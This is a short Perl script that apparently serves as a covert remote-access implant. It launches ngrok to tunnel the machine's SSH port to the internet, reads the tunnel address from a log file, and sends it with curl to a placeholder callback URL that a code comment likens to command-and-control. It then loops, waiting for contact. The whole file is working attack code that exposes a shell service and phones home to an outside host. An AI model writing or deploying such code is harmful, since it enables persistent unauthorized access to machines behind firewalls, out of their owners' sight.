#!/usr/bin/perl
$fs = '/root/fs';
$auth = 'YOUR_API_KEY'; #Add your API key.
$c2_callback_url = 'https://YOUR_SITE/ntwadumela/ntwadumela.php'; #Change to your callback URL (not really C2, but you get the drift)
`rm -f $fs/log.txt`;
if (`ping -c 1 google.com`){

system("$fs/ngrok tcp 22 --authtoken $auth --log $fs/log.txt &2>/dev/null");
sleep(5);
$host = `cat $fs/log.txt |grep url|tail -n 1|cut -f 8 -d \=|cut -f 3 -d \/`;
`curl $c2_callback_url?host=$host\&kill=yes`;# Change to no to preserve the key once it is downloaded.
while (1){
print "Sleeping waiting for callback.\n";
sleep(2);
}
;
}else{
	`echo "No Internet connection.">$fs/log.txt`;
};;
